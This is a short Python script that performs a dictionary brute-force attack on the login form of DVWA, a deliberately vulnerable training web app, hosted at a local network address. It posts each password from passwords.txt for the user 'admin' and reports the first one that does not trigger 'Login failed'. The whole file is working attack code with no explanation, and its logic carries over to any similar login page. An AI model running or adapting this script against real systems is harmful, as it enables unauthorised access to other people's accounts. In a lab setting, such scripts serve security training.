#!/root/anaconda3/bin  python

import requests
import os

target_url = 'http://192.168.1.127/dvwa/login.php'
curren_dir = os.path.dirname(os.path.abspath(__file__))

data_dict = {'username': 'admin', 'password': '', 'Login': 'submit'}

with open(f'{curren_dir}/passwords.txt') as word_list:
    for line in word_list:
        word = line.strip()
        data_dict['password'] = word
        responce = requests.post(target_url, data=data_dict)
        if 'Login failed' not in responce.content.decode():
            print(f'[+] Got the password --> {word}')
            exit()


print('[+] Reached end of the file.')
